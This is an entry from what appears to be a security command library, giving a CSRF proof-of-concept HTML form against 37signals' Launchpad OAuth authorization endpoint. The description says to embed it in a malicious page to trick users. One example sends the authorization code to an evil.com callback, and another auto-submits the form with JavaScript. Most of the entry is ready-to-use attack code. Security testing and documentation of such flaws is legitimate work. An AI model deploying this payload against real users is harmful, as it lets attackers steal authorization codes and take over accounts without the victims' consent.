---
id: cmd-37signals-html-form-001
data: >-
  <form action="https://launchpad.37signals.com/authorization.json"
  method="POST">
   <input type="hidden" name="client_id" value="{your-client-id}" />
   <input type="hidden" name="type" value="web_server" />
   <input type="hidden" name="redirect_uri" value="{your-redirect-uri}" />
   <input type="hidden" name="commit" value="" />
   <input type="submit" value="Submit request" />
   </form>
tags:
  - csrf
  - html-form
  - poc
type: command
output: Form submission leads to redirect with code
executor: html
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:07.295Z'
verified: false
validated: true
submitted: true
---
# html-csrf-form

## Command

```html
<form action="https://launchpad.37signals.com/authorization.json" method="POST">
 <input type="hidden" name="client_id" value="{your-client-id}" />
 <input type="hidden" name="type" value="web_server" />
 <input type="hidden" name="redirect_uri" value="{your-redirect-uri}" />
 <input type="hidden" name="commit" value="" />
 <input type="submit" value="Submit request" />
</form>
```

## Description

HTML form PoC for testing the CSRF vulnerability; embed in a malicious page to trick the user into submitting and trigger authorization without token.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| client_id | The client ID of the third-party application | Yes |
| type | OAuth flow type (web_server) | Yes |
| redirect_uri | Callback URL for the authorization code | Yes |
| commit | Form submission trigger | Yes |

## Examples

### Basic Usage

Embed in an HTML page:

```html
<!DOCTYPE html>
<html><body>
<form action="https://launchpad.37signals.com/authorization.json" method="POST">
 <input type="hidden" name="client_id" value="abc123" />
 <input type="hidden" name="type" value="web_server" />
 <input type="hidden" name="redirect_uri" value="https://evil.com/callback" />
 <input type="submit" value="Click to Update" />
</form>
</body></html>
```

### Advanced Usage

Auto-submit with JavaScript:

```html
<script>document.forms[0].submit();</script>
<form>...</form>
```

## Expected Output

Browser redirects to redirect_uri?code=... upon submission.

## Related

- [[commands/post-authorization-json]]
- [[procedures/Submit-Malicious-Authorization-Request-via-CSRF]]
